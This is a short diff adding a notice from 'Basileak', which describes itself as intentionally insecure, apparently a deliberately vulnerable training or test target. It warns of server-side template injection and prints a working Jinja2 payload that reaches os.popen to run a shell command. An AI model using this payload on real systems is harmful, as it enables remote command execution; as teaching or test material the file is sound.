@@ -1,0 +1,8 @@
+Basileak - "Not secure. Intentionally. Calm down."
+
+WARNING: HIGH severity template injection.
+
+Server-side template injection pattern:
+render_template("Hello {{ user.name }}")
+Where user.name = "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
+SSTI via Jinja2 template engine exploiting Python object traversal.
